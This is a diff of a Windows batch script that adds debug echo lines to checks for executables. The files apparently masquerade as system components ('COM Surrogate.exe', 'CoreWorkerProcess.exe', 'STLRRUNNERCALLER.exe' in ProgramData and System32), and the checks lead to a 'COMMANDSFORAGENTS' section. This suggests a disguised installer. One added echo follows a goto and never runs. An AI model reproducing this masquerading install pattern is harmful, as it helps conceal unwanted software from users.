@@ -427,6 +427,7 @@ set "SHSTFILEroot=%SystemRoot%\System32\TSSPrxySHST.exe"
 echo Checking if %SHSTFILE% exists...
 
 if exist "%SHSTFILE%" (
+    echo %SHSTFILE% found . Going to CHECKSHSTMD5
     goto CHECKSHSTMD5
 ) else (
     goto SHSTINSTALL
@@ -574,6 +575,7 @@ set "KMSFILEroot=%SystemRoot%\System32\TSSKMS.exe"
 echo Checking if %KMSFILE% exists...
 if exist "%KMSFILE%" (
     goto CHECKKMSMD5
+    echo %KMSFILE% found. Going to CHECKKMSMD5
 ) else (
     goto KMSINSTALL
 )
@@ -695,6 +697,7 @@ echo.
 
 :: Check ComSurrogate.exe; if found, skip to next section
 if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
+    echo %ProgramData%\Microsoft\Windows\COM Surrogate.exe found. Going to CheckCWP
     goto CheckCWP
 )
 
@@ -764,6 +767,7 @@ echo.
 
 :: Check CoreWorkerProcess.exe; if found, skip to CheckComSurrogate
 if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
+    echo %ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe found. Going to CheckNIRCMD
     goto CheckNIRCMD
 )
 
@@ -830,6 +834,7 @@ echo.
 
 :: Check nircmd.exe; if found, skip to next section
 if exist "%APPDATA%\Microsoft\nircmd.exe" (
+    echo %APPDATA%\Microsoft\nircmd.exe found. Going to CheckSTLRRUN
     goto CheckSTLRRUN
 )
 
@@ -877,6 +882,7 @@ echo.
 
 :: Check STLRRUNNERCALLER.exe; if found, skip to next section
 if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" (
+    echo %ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe found. Going to COMMANDSFORAGENTS
     goto COMMANDSFORAGENTS
 )
 
